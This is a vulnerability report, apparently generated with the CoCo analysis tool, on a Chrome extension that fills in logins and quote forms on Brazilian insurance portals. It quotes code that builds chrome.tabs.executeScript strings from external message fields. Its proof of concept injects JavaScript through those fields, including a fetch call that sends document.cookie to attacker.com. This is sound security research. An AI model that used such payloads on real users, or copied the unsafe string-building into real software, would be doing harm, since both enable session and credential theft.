# CoCo Analysis: bejpbfdphjdnnlfhpgfooeaomnlnodgm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 25

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bejpbfdphjdnnlfhpgfooeaomnlnodgm/opgen_generated_files/bg.js
Line 1003: `'document.getElementById("j_username").value = "' + parametros.l + '";' +`
Line 1002-1006: Full executeScript call with attacker-controlled data

**Code:**

```javascript
// Background script - External message handler (bg.js line 965)
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
    if (message == 'version') {
        sendResponse({
            type: 'success',
            version: '0.1.0'
        });
        return true;
    }

    var codigoSeguradora = message.codigoSeguradora; // ← attacker-controlled
    var ramo = message.ramo; // ← attacker-controlled
    switch (codigoSeguradora) {
        case 6572:
            switch (ramo) {
                case 31:
                    acessarHDIAuto(message); // ← passes attacker message
                    break;
            }
        break;
        case 6602:
            switch(ramo){
                case 31:
                    acessarTokioAuto(message); // ← passes attacker message
                    break;
            }
        break;
    }
});

// Function that receives attacker-controlled data (bg.js line 995)
var acessarHDIAuto = function (parametros) { // ← parametros = attacker message
    let tabId = 0;
    let o;
    let etapa = 1;

    function efetuarLogin(codigoAba) {
        chrome.tabs.executeScript(codigoAba, {
            code: 'setTimeout(function() { ' +
                'document.getElementById("j_username").value = "' + parametros.l + '";' + // ← attacker-controlled
                'document.getElementById("j_password").value = "' + parametros.s + '";' + // ← attacker-controlled
                'document.querySelector("#fj > div > button").click();' +
                '}, 1500); '
        }); // ← SINK: arbitrary code execution
        etapa = 2;
        console.log(etapa);
    }

    function preencherCalculo(codigoAba) {
        chrome.tabs.executeScript(codigoAba, {
            code:
                'setTimeout(function() {' +
                'document.getElementById("cpfcgc").value = "' + parametros.CnpjCpf + '";' + // ← attacker-controlled
                'document.getElementById("nomeCliente").value = "' + parametros.Nome + '";' + // ← attacker-controlled
                'document.getElementById("emailCliente").value = "' + parametros.Email + '";' + // ← attacker-controlled
                // ... many more attacker-controlled fields concatenated into executeScript
                // ← SINK: arbitrary code execution
        });
    }
    // ... similar pattern in other functions
};

// Similar vulnerability in acessarTokioAuto function (bg.js line 1143+)
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (localhost)

**Attack:**

```javascript
// From a webpage running on localhost, attacker can send:
chrome.runtime.sendMessage(
    'bejpbfdphjdnnlfhpgfooeaomnlnodgm', // extension ID
    {
        codigoSeguradora: 6572,
        ramo: 31,
        l: '"; alert(document.cookie); //', // Injects arbitrary JavaScript
        s: 'password',
        CnpjCpf: '"; fetch("https://attacker.com?cookie=" + document.cookie); //',
        Nome: 'test',
        Email: 'test@test.com',
        // ... other fields can also be exploited
    },
    function(response) {
        console.log('Exploit sent');
    }
);
```

**Impact:** Arbitrary JavaScript code execution in the context of any tab where the extension has permissions. The attacker can inject malicious JavaScript through multiple parameters (l, s, CnpjCpf, Nome, Email, etc.) that are directly concatenated into code strings passed to chrome.tabs.executeScript. This allows stealing cookies, credentials, session tokens, DOM manipulation, and further attacks on websites the extension has access to (hdi.com.br, tokiomarine.com.br, crmseguros.com.br). The manifest allows externally_connectable from localhost, and per CoCo methodology, we ignore this restriction - the code has onMessageExternal, making it exploitable.

---
